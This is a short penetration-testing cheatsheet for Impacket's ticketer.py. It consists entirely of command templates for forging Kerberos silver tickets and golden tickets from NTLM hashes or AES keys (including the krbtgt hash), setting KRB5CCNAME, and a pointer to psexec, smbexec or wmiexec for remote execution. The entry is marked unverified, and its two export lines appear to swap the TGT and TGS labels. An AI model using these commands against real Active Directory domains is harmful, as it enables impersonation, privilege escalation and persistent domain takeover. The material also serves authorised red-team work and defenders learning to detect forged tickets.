---
id: 7e1b71ae-c6ca-4fe2-a796-be8fbd24cb64
name: ticketer.py
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:48.741544+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# ticketer.py

# silver_ticket

**Command** ([[to generate the TGS with NTLM]]):

```bash
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>

```

**Command** ([[to generate the TGS with AES key]]):

```bash
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>

```

**Command** ([[set the TGT for impacket use]]):

```bash
export KRB5CCNAME=<TGT_ccache_file>

```

# golden_ticket

**Command** ([[to generate the TGT with NTLM]]):

```bash
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>

```

**Command** ([[to generate the TGT with AES key]]):

```bash
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> <user_name>

```

**Command** ([[set the ticket for impacket use]]):

```bash
export KRB5CCNAME=<TGS_ccache_file>

```

search for psexec.py, smbexec.py or wmiexec.py
